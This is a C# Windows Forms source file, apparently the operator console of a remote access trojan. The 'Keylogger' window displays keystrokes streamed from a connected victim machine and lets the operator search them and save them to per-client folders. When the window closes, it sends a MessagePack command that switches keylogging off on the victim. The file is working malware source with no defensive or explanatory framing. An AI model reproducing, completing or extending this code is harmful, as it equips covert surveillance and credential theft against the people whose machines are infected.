using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms;

public class FormKeylogger : Form
{
	public StringBuilder Sb = new StringBuilder();

	private IContainer components;

	private ToolStrip toolStrip1;

	private ToolStripLabel toolStripLabel1;

	private ToolStripTextBox toolStripTextBox1;

	private ToolStripSeparator toolStripSeparator1;

	private ToolStripButton toolStripButton1;

	public RichTextBox richTextBox1;

	public System.Windows.Forms.Timer timer1;

	public Form1 F { get; set; }

	internal Clients Client { get; set; }

	public FormKeylogger()
	{
		InitializeComponent();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
	{
		Sb?.Clear();
		if (Client != null)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "keyLogger";
				msgPack.ForcePathObject("isON").AsString = "false";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			});
		}
	}

	private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		richTextBox1.SelectionStart = 0;
		richTextBox1.SelectAll();
		richTextBox1.SelectionBackColor = Color.White;
		if (e.KeyData != Keys.Return || string.IsNullOrWhiteSpace(toolStripTextBox1.Text))
		{
			return;
		}
		int num;
		for (int i = 0; i < richTextBox1.TextLength; i += num + toolStripTextBox1.Text.Length)
		{
			num = richTextBox1.Find(toolStripTextBox1.Text, i, RichTextBoxFinds.None);
			if (num != -1)
			{
				richTextBox1.SelectionStart = num;
				richTextBox1.SelectionLength = toolStripTextBox1.Text.Length;
				richTextBox1.SelectionBackColor = Color.Yellow;
				continue;
			}
			break;
		}
	}

	private void ToolStripButton1_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID + "\\Keylogger");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			File.WriteAllText(text + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", richTextBox1.Text.Replace("\n", Environment.NewLine));
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormKeylogger));
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.toolStrip1 = new System.Windows.Forms.ToolStrip();
		this.toolStripLabel1 = new System.Windows.Forms.ToolStripLabel();
		this.toolStripTextBox1 = new System.Windows.Forms.ToolStripTextBox();
		this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripButton1 = new System.Windows.Forms.ToolStripButton();
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.toolStrip1.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.toolStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.toolStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.toolStripLabel1, this.toolStripTextBox1, this.toolStripSeparator1, this.toolStripButton1 });
		this.toolStrip1.Location = new System.Drawing.Point(0, 0);
		this.toolStrip1.Name = "toolStrip1";
		this.toolStrip1.Size = new System.Drawing.Size(731, 34);
		this.toolStrip1.TabIndex = 0;
		this.toolStrip1.Text = "toolStrip1";
		this.toolStripLabel1.Name = "toolStripLabel1";
		this.toolStripLabel1.Size = new System.Drawing.Size(64, 29);
		this.toolStripLabel1.Text = "Search";
		this.toolStripTextBox1.Name = "toolStripTextBox1";
		this.toolStripTextBox1.Size = new System.Drawing.Size(100, 34);
		this.toolStripTextBox1.Text = "...";
		this.toolStripTextBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(ToolStripTextBox1_KeyDown);
		this.toolStripSeparator1.Name = "toolStripSeparator1";
		this.toolStripSeparator1.Size = new System.Drawing.Size(6, 34);
		this.toolStripButton1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		this.toolStripButton1.Image = (System.Drawing.Image)resources.GetObject("toolStripButton1.Image");
		this.toolStripButton1.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.toolStripButton1.Name = "toolStripButton1";
		this.toolStripButton1.Size = new System.Drawing.Size(53, 29);
		this.toolStripButton1.Text = "Save";
		this.toolStripButton1.Click += new System.EventHandler(ToolStripButton1_Click);
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.richTextBox1.Location = new System.Drawing.Point(0, 34);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(731, 376);
		this.richTextBox1.TabIndex = 1;
		this.richTextBox1.Text = "";
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(731, 410);
		base.Controls.Add(this.richTextBox1);
		base.Controls.Add(this.toolStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormKeylogger";
		this.Text = "Keylogger";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Keylogger_FormClosed);
		this.toolStrip1.ResumeLayout(false);
		this.toolStrip1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
